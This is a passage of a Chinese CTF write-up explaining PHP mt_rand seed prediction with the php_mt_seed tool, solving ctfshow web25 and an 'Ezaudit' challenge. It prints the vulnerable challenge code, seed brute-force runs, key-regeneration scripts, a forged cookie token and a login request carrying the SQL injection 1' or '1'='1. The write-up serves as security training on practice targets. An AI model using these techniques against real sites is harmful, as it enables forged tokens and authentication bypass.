<h3 id="2-根据随机数预测种子"><a href="#2-根据随机数预测种子" class="headerlink" title="2.根据随机数预测种子"></a>2.根据随机数预测种子</h3><p>既然知道了,同一个种子生成的序列是固定的,那么也能根据序列猜测seed</p>
<p>工具:php_mt_seed:<a target="_blank" rel="noopener" href="https://github.com/lepiaf/php_mt_seed">https://github.com/lepiaf/php_mt_seed</a><br>Linux下安装使用方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/openwall/php_mt_seed.git</span><br>cd php_mt_seed/<br>gcc php_mt_seed.c -o php_mt_seed<br>make<br></code></pre></td></tr></table></figure>
<p>使用方法 ./php_mt_seed 随机数</p>
<p>先用种子123456生成一个随机数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>mt_srand(<span class="hljs-number">12345</span>);    <br><span class="hljs-keyword">echo</span> mt_rand();<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
<p>得到随机数162946439，然后使用php_mt_seed工具查找种子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ ./php_mt_seed <span class="hljs-number">162946439</span><br>Pattern: EXACT<br>Version: <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span><br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0xfc000000</span> - <span class="hljs-number">0xffffffff</span>, speed <span class="hljs-number">103.5</span> Mseeds/s <br>Version: <span class="hljs-number">5.2</span><span class="hljs-number">.1</span>+<br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0x00000000</span> - <span class="hljs-number">0x01ffffff</span>, speed <span class="hljs-number">0.0</span> Mseeds/s <br>seed = <span class="hljs-number">0x00003039</span> = <span class="hljs-number">12345</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br>Found <span class="hljs-number">1</span>, trying <span class="hljs-number">0x04000000</span> - <span class="hljs-number">0x05ffffff</span>, speed <span class="hljs-number">0.9</span> Mseeds/s <br>seed = <span class="hljs-number">0x05efcd66</span> = <span class="hljs-number">99601766</span> (PHP <span class="hljs-number">7.1</span><span class="hljs-number">.0</span>+)<br></code></pre></td></tr></table></figure>
<p>这个12345就是我们上面设置的种子</p>
<p><strong>注意：php_mt_seed 工具只能用于爆破mt_rand()函数产生的随机数的种子值， 无论是否显式调用mt_srand()函数播种，但不能用于mt_rand(1,1000)这种指定范围的和rand函数的爆破</strong></p>
<p><strong>ctfshow-web入门-web25</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(hexdec(substr(md5(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>


<p>审计代码知道我们传入的参数减去生成的mt_rand()要等于0才能进入下一个判断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br></code></pre></td></tr></table></figure>
<p>mt_rand()未知，但是当判断不正确时，会输出$rand，尝试反推出mt_srand。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=<span class="hljs-number">0</span><br><span class="hljs-number">-214290638</span><br></code></pre></td></tr></table></figure>
<p>此时rand=-214290638，所以得到mt_rand=214290638，</p>
<p>通过抓包查看响应头我们可以知道该php版本为7.3.11,接下来爆破种子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ time ./php_mt_seed <span class="hljs-number">214290638</span>                                                                                                                                               <span class="hljs-number">130</span> ⨯<br>Pattern: EXACT<br>Version: <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span><br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0xb8000000</span> - <span class="hljs-number">0xbbffffff</span>, speed <span class="hljs-number">81.9</span> Mseeds/s <br>seed = <span class="hljs-number">0xba9c3466</span> = <span class="hljs-number">3130799206</span> (PHP <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span>)<br>seed = <span class="hljs-number">0xba9c3467</span> = <span class="hljs-number">3130799207</span> (PHP <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span>)<br>Found <span class="hljs-number">2</span>, trying <span class="hljs-number">0xfc000000</span> - <span class="hljs-number">0xffffffff</span>, speed <span class="hljs-number">81.2</span> Mseeds/s <br>Version: <span class="hljs-number">5.2</span><span class="hljs-number">.1</span>+<br>Found <span class="hljs-number">2</span>, trying <span class="hljs-number">0x2e000000</span> - <span class="hljs-number">0x2fffffff</span>, speed <span class="hljs-number">0.9</span> Mseeds/s <br>seed = <span class="hljs-number">0x2f5150d3</span> = <span class="hljs-number">793858259</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br>Found <span class="hljs-number">3</span>, trying <span class="hljs-number">0xbe000000</span> - <span class="hljs-number">0xbfffffff</span>, speed <span class="hljs-number">0.7</span> Mseeds/s <br>seed = <span class="hljs-number">0xbefdafcd</span> = <span class="hljs-number">3204296653</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br>Found <span class="hljs-number">4</span>, trying <span class="hljs-number">0xd4000000</span> - <span class="hljs-number">0xd5ffffff</span>, speed <span class="hljs-number">0.7</span> Mseeds/s <br>seed = <span class="hljs-number">0xd4414cf6</span> = <span class="hljs-number">3561049334</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br>seed = <span class="hljs-number">0xd4414cf6</span> = <span class="hljs-number">3561049334</span> (PHP <span class="hljs-number">7.1</span><span class="hljs-number">.0</span>+)<br></code></pre></td></tr></table></figure>
<p>得到种子3561049334</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">3561049334</span>);<br><span class="hljs-variable">$r</span>=mt_rand();<br><span class="hljs-variable">$token</span>=mt_rand()+mt_rand();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$token</span>;<br><br><span class="hljs-number">214290638</span><br><span class="hljs-number">2311762511</span><br></code></pre></td></tr></table></figure>
<p>Payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=<span class="hljs-number">214290638</span> <br>Cookie: token=<span class="hljs-number">2311762511</span><br></code></pre></td></tr></table></figure>




<p><strong>Ezaudit</strong></p>
<p>源码泄露，访问/<a target="_blank" rel="noopener" href="http://www.zip可下载源码/">www.zip可下载源码</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysql_fetch_assoc(<span class="hljs-variable">$result</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>  &#125;<br>  <span class="hljs-variable">$Public_key</span> = public_key();<br>  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure>


<p>在源码中看到有个login.html<br><img src="https://img-blog.csdnimg.cn/e3784f580fc14df084166469a4501ee0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="img"><br>继续看代码，输入账号密码以及私钥，用户名已知是<code>crispr</code>了，接下来密码和私钥输对了就能得到flag。密码可以直接用万能密码1’ or ‘1’=’1  来绕过，主要获取私钥。</p>
<p>私钥和公钥的生成都用到了mt_rand()，而公钥的值已经给出了是<code>$Public_key = KVQP0LdJKRaV3n9D</code>，那么我们就可以根据这个公钥推算出种子，然后再根据种子得到私钥。</p>
<p>先要把公钥转换成php_mt_seed可识别的参数，用文档中给的脚本<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">pw2args.php</a>进行转换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">php版<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowable_characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$allowable_characters</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pass</span> = <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$pass</span>); <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$number</span> = strpos(<span class="hljs-variable">$allowable_characters</span>, <span class="hljs-variable">$pass</span>[<span class="hljs-variable">$i</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$number</span> <span class="hljs-subst">$number</span> 0 <span class="hljs-subst">$len</span> &quot;</span>;<br> &#125;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br> <span class="hljs-meta">?&gt;</span><br><br><br>python版<br>str1 =<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br>str2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br>res =<span class="hljs-string">&#x27;&#x27;</span><br>length = str(len(str2)<span class="hljs-number">-1</span>)<br><span class="hljs-keyword">for</span> i in range(len(str1)):<br>    <span class="hljs-keyword">for</span> j in range(len(str2)):<br>        <span class="hljs-keyword">if</span> str1[i] ==  str2[j]:<br>            res += str(j) + <span class="hljs-string">&#x27; &#x27;</span> +str(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + length + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">print</span>(res)<br></code></pre></td></tr></table></figure>


<p>运行得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ php pw2args.php KVQP0LdJKRaV3n9D                                                                                <br>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61<br><br>┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ python3 p.py<br>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61<br></code></pre></td></tr></table></figure>


<p>然后使用php_mt_seed爆破种子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/php_mt_seed/php_mt_seed-main]<br>└─$ time ./php_mt_seed <span class="hljs-number">36</span> <span class="hljs-number">36</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">47</span> <span class="hljs-number">47</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">52</span> <span class="hljs-number">52</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">35</span> <span class="hljs-number">35</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">36</span> <span class="hljs-number">36</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">43</span> <span class="hljs-number">43</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">47</span> <span class="hljs-number">47</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">55</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">13</span> <span class="hljs-number">13</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">61</span> <span class="hljs-number">61</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">29</span> <span class="hljs-number">29</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <br>Pattern: EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span> EXACT-<span class="hljs-keyword">FROM</span><span class="hljs-number">-62</span><br>Version: <span class="hljs-number">3.0</span><span class="hljs-number">.7</span> to <span class="hljs-number">5.2</span><span class="hljs-number">.0</span><br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0xfc000000</span> - <span class="hljs-number">0xffffffff</span>, speed <span class="hljs-number">42.9</span> Mseeds/s <br>Version: <span class="hljs-number">5.2</span><span class="hljs-number">.1</span>+<br>Found <span class="hljs-number">0</span>, trying <span class="hljs-number">0x68000000</span> - <span class="hljs-number">0x69ffffff</span>, speed <span class="hljs-number">0.5</span> Mseeds/s <br>seed = <span class="hljs-number">0x69cf57fb</span> = <span class="hljs-number">1775196155</span> (PHP <span class="hljs-number">5.2</span><span class="hljs-number">.1</span> to <span class="hljs-number">7.0</span>.x; HHVM)<br></code></pre></td></tr></table></figure>


<p>抓包发现PHP/5.6.40，所以种子值为 1775196155</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    mt_srand(<span class="hljs-number">1775196155</span>);<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>        <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>        <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>&#125;<br>public_key();<br><span class="hljs-keyword">echo</span> private_key();<br></code></pre></td></tr></table></figure>


<p>得到私钥<code>XuNhoueCDCGc</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /login.php<br><br>username=crispr&amp;password=<span class="hljs-number">1</span><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>&amp;Private_key=XuNhoueCDCGc&amp;login=%E7%<span class="hljs-number">99</span>%BB%E5%BD%<span class="hljs-number">95</span><br></code></pre></td></tr></table></figure>


